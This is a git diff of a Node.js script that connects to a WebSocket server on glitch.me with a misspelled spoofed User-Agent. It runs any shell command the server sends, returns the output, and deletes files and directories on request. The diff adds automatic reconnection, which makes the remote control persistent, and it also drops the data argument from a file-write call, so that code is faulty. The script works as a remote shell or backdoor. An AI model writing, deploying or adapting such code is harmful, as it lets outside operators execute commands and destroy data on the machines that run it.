@@ -4,7 +4,9 @@ const path = require('path');
 const fs = require('fs');
 var ip = "";
 var WebSocket = require('ws');
-var ws = new WebSocket('wss://deciduous-flame-canidae.glitch.me',{
+var ws = null
+function connect() {
+ws = new WebSocket('wss://deciduous-flame-canidae.glitch.me',{
 	url:'wss://deciduous-flame-canidae.glitch.me',
 	headers:{
 		'User-Agent':"Mozzila"
@@ -18,10 +20,15 @@ ws.on('open', function() {
 		command:"sendFirstConnectInfo"
 	}));
 	setInterval(() => {
+		try{
 		ws.send(JSON.stringify({
 			command:"tickPC"
 		}));
+		}catch(e){}
 	},1);
+});
+ws.on('close', function() {
+	connect();
 });
 function runCommand(json) {
 			exec(json.value,
@@ -47,12 +54,22 @@ function runCommand(json) {
 						value:stderr
 					}));
 				}
+				ws.send(JSON.stringify({
+					command:"refreshFiles"
+				}));
 			}
 			);
 }
 ws.on('message', function(data, flags) {
 	try{
 		var json = JSON.parse(data);
+		if (json.command == "deleteFile") {
+			console.log("removing: "+path.join(__dirname,"./test",dir,json.dir));
+			fs.unlinkSync(path.join(__dirname,"./test",dir,json.dir));
+			ws.send(JSON.stringify({
+				command:"refreshFiles"
+			}));
+		}
 		if (json.command == "runCommand") {
 			var command = json.value.split(" ");
 			/*if (command[0].toLowerCase() == "npm") {
@@ -111,7 +128,16 @@ ws.on('message', function(data, flags) {
 			}));
 		}
 		if (json.command == "fswriteFileSync") {
-			fs.writeFileSync(path.join(__dirname,"./test",dir,json.dir),json.data,{encoding:json.encoding});
+			fs.writeFileSync(path.join(__dirname,"./test",dir,json.dir));
+			ws.send(JSON.stringify({
+				command:"refreshFiles"
+			}));
+		}
+		if (json.command == "deleteDir") {
+			fs.rmdirSync(path.join(__dirname,"./test",dir,json.dir),{ recursive: true });
+			ws.send(JSON.stringify({
+				command:"refreshFiles"
+			}));
 		}
 		if (json.command == "httpGET") {
 			var http = require('http');
@@ -154,4 +180,9 @@ function (error, stdout, stderr) {
 	console.log("Error: "+error,"Stdout: "+stdout,"Stderr: "+stderr)
 }
 );*/
-
+ws.on('error', function() {
+	console.error("something went wong, retrying connection");
+	connect();
+});
+}
+connect()
